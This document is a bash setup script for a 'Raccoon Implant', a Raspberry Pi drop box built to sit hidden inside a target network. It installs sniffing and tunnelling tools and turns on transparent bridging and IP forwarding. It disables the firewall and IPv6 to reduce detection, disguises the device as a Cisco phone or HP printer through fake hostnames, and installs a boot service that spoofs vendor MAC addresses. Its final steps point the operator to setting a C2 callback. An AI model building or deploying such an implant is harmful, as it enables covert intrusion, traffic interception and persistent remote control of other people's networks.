#!/bin/bash
# Raccoon Implant — Initial Raspberry Pi setup
# Run on a fresh ParrotOS (ARM64) installation for Raspberry Pi 4.
set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

INSTALL_DIR="/opt/raccoon"

echo -e "${CYAN}"
echo "  ╔═══════════════════════════════════════╗"
echo "  ║   Raccoon Implant — Bootstrap         ║"
echo "  ║   Target OS: ParrotOS ARM64           ║"
echo "  ╚═══════════════════════════════════════╝"
echo -e "${NC}"

if [ "$EUID" -ne 0 ]; then
    echo -e "${RED}[!] Must run as root (sudo)${NC}"
    exit 1
fi

# Verify we're on a Debian/Parrot system
if [ ! -f /etc/debian_version ]; then
    echo -e "${RED}[!] This script requires a Debian-based system (ParrotOS)${NC}"
    exit 1
fi

if [ -f /etc/parrot/parrot-release ]; then
    echo -e "${GREEN}[+] Detected ParrotOS$(cat /etc/parrot/parrot-release 2>/dev/null | head -1)${NC}"
elif [ -f /etc/os-release ]; then
    . /etc/os-release
    echo -e "${YELLOW}[!] Expected ParrotOS, detected: ${PRETTY_NAME}${NC}"
    echo -e "${YELLOW}    Proceeding anyway (Debian-compatible)${NC}"
fi

ACTUAL_USER="${SUDO_USER:-$USER}"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_DIR="$(cd "${SCRIPT_DIR}/../.." && pwd)"

# ── System Update ──
echo -e "${GREEN}[+] Updating package lists${NC}"
apt-get update -qq

echo -e "${GREEN}[+] Upgrading system packages${NC}"
apt-get upgrade -y -qq

# ── Dependencies ──
# ParrotOS ships many of these pre-installed (tcpdump, scapy, nmap, etc.)
# We install only what might be missing.
echo -e "${GREEN}[+] Installing dependencies${NC}"
apt-get install -y -qq \
    python3-pip \
    python3-venv \
    python3-scapy \
    bridge-utils \
    tcpdump \
    iptables \
    ebtables \
    arptables \
    nftables \
    ethtool \
    net-tools \
    macchanger \
    autossh \
    x11vnc \
    xvfb \
    libpcap-dev \
    portaudio19-dev \
    git \
    dnsutils

# ── Install Directory ──
echo -e "${GREEN}[+] Creating install directory: ${INSTALL_DIR}${NC}"
mkdir -p "${INSTALL_DIR}"/{captures,logs}
cp -r "${PROJECT_DIR}/software" "${INSTALL_DIR}/"
cp -r "${PROJECT_DIR}/configs" "${INSTALL_DIR}/"

# ── Python Environment ──
echo -e "${GREEN}[+] Setting up Python virtual environment${NC}"
python3 -m venv "${INSTALL_DIR}/venv" --system-site-packages
"${INSTALL_DIR}/venv/bin/pip" install --upgrade pip -q
"${INSTALL_DIR}/venv/bin/pip" install -r "${PROJECT_DIR}/software/requirements.txt" -q

# ── Permissions ──
echo -e "${GREEN}[+] Setting permissions${NC}"
chown -R "${ACTUAL_USER}:${ACTUAL_USER}" "${INSTALL_DIR}"
chmod 700 "${INSTALL_DIR}/captures"
chmod 700 "${INSTALL_DIR}/logs"

# ── Network: IP Forwarding ──
echo -e "${GREEN}[+] Enabling IP forwarding (persistent)${NC}"
if ! grep -q "net.ipv4.ip_forward=1" /etc/sysctl.conf; then
    echo "net.ipv4.ip_forward=1" >> /etc/sysctl.conf
fi
sysctl -w net.ipv4.ip_forward=1 > /dev/null

# ── Network: Bridge Kernel Module ──
echo -e "${GREEN}[+] Loading bridge kernel module${NC}"
modprobe br_netfilter 2>/dev/null || true
if [ ! -f /etc/modules-load.d/raccoon-bridge.conf ]; then
    echo "br_netfilter" > /etc/modules-load.d/raccoon-bridge.conf
fi

# ── Network: Disable bridge netfilter (transparent L2 forwarding) ──
echo -e "${GREEN}[+] Configuring transparent bridging (disable netfilter on bridge)${NC}"
sysctl -w net.bridge.bridge-nf-call-iptables=0 > /dev/null 2>&1 || true
sysctl -w net.bridge.bridge-nf-call-ip6tables=0 > /dev/null 2>&1 || true
sysctl -w net.bridge.bridge-nf-call-arptables=0 > /dev/null 2>&1 || true

cat > /etc/sysctl.d/99-raccoon-bridge.conf <<EOF
net.bridge.bridge-nf-call-iptables=0
net.bridge.bridge-nf-call-ip6tables=0
net.bridge.bridge-nf-call-arptables=0
EOF

# ── Network: Disable IPv6 (reduce noise on the wire) ──
echo -e "${GREEN}[+] Disabling IPv6 (reduce network fingerprint)${NC}"
cat > /etc/sysctl.d/99-raccoon-noipv6.conf <<EOF
net.ipv6.conf.all.disable_ipv6=1
net.ipv6.conf.default.disable_ipv6=1
EOF
sysctl -w net.ipv6.conf.all.disable_ipv6=1 > /dev/null 2>&1 || true

# ── Network: Disable Parrot's default firewall if active ──
echo -e "${GREEN}[+] Disabling default firewall rules for bridge mode${NC}"
if systemctl is-active --quiet ufw 2>/dev/null; then
    ufw disable 2>/dev/null || true
    systemctl disable ufw 2>/dev/null || true
    echo -e "${YELLOW}    UFW disabled (bridge requires unrestricted L2 forwarding)${NC}"
fi

# ── Disable unnecessary ParrotOS services (reduce footprint) ──
echo -e "${GREEN}[+] Disabling unnecessary services${NC}"
for svc in avahi-daemon cups bluetooth ModemManager; do
    if systemctl is-enabled --quiet "$svc" 2>/dev/null; then
        systemctl disable "$svc" 2>/dev/null || true
        systemctl stop "$svc" 2>/dev/null || true
        echo -e "    Disabled: ${svc}"
    fi
done

# ── Hostname ──
echo -e "${GREEN}[+] Configuring hostname${NC}"
COVER_MODE=$(grep -oP 'mode:\s*"\K[^"]+' "${INSTALL_DIR}/configs/raccoon.yaml" 2>/dev/null || echo "cisco_phone")
if [ "$COVER_MODE" = "hp_printer" ]; then
    DEVICE_HOSTNAME="HP-LaserJet-$(head -c 2 /dev/urandom | xxd -p)"
else
    DEVICE_HOSTNAME=$(grep -oP 'hostname:\s*"\K[^"]+' "${INSTALL_DIR}/configs/raccoon.yaml" 2>/dev/null || echo "SEP001BD5A1B2C3")
fi
hostnamectl set-hostname "${DEVICE_HOSTNAME}" 2>/dev/null || hostname "${DEVICE_HOSTNAME}"
echo -e "    Hostname: ${DEVICE_HOSTNAME}"

# ── MAC Address Spoofing (preparation) ──
echo -e "${GREEN}[+] Preparing MAC address spoofing${NC}"
cat > /etc/systemd/system/raccoon-macspoof.service <<EOF
[Unit]
Description=Raccoon Implant — MAC Address Spoof
Before=network-pre.target
Wants=network-pre.target

[Service]
Type=oneshot
RemainAfterExit=yes
# Spoof both interfaces with vendor-appropriate OUIs
# Adjust MAC prefix per cover mode in raccoon.yaml
ExecStart=/bin/bash -c '\
  COVER=\$(grep -oP "mode:\\s*\\"\\K[^\\"]*" /opt/raccoon/configs/raccoon.yaml 2>/dev/null || echo cisco_phone); \
  if [ "\$COVER" = "hp_printer" ]; then \
    PREFIX="00:1e:0b"; \
  else \
    PREFIX="00:1b:d5"; \
  fi; \
  UPSTREAM=\$(grep -oP "upstream_iface:\\s*\\"\\K[^\\"]*" /opt/raccoon/configs/raccoon.yaml 2>/dev/null || echo eth0); \
  DOWNSTREAM=\$(grep -oP "downstream_iface:\\s*\\"\\K[^\\"]*" /opt/raccoon/configs/raccoon.yaml 2>/dev/null || echo eth1); \
  ip link set \$UPSTREAM down 2>/dev/null; \
  macchanger -m \${PREFIX}:\$(openssl rand -hex 3 | sed "s/\\(..\\)/\\1:/g;s/:$//") \$UPSTREAM 2>/dev/null; \
  ip link set \$UPSTREAM up 2>/dev/null; \
  ip link set \$DOWNSTREAM down 2>/dev/null; \
  macchanger -m \${PREFIX}:\$(openssl rand -hex 3 | sed "s/\\(..\\)/\\1:/g;s/:$//") \$DOWNSTREAM 2>/dev/null; \
  ip link set \$DOWNSTREAM up 2>/dev/null; \
'

[Install]
WantedBy=network-pre.target
EOF
systemctl daemon-reload
systemctl enable raccoon-macspoof.service 2>/dev/null || true
echo -e "    MAC spoof service installed (activates on boot before networking)"

echo ""
echo -e "${GREEN}============================================${NC}"
echo -e "${GREEN}  Bootstrap complete! (ParrotOS)${NC}"
echo -e "${GREEN}============================================${NC}"
echo ""
echo -e "${YELLOW}Next steps:${NC}"
echo "  1. Edit ${INSTALL_DIR}/configs/raccoon.yaml"
echo "     - Set cover.mode (cisco_phone / hp_printer)"
echo "     - Set C2 callback URL and domain"
echo "  2. Run: sudo ${PROJECT_DIR}/software/setup/configure_bridge.sh"
echo "  3. Run: sudo ${PROJECT_DIR}/services/install.sh"
echo "  4. Reboot to activate MAC spoofing + bridge"
echo ""
echo -e "${CYAN}ParrotOS-specific notes:${NC}"
echo "  - scapy, tcpdump, nmap are pre-installed"
echo "  - macchanger installed for boot-time MAC spoofing"
echo "  - UFW disabled for transparent bridge operation"
echo "  - IPv6 disabled to reduce network noise"
echo "  - avahi/cups/bluetooth services disabled"
echo ""
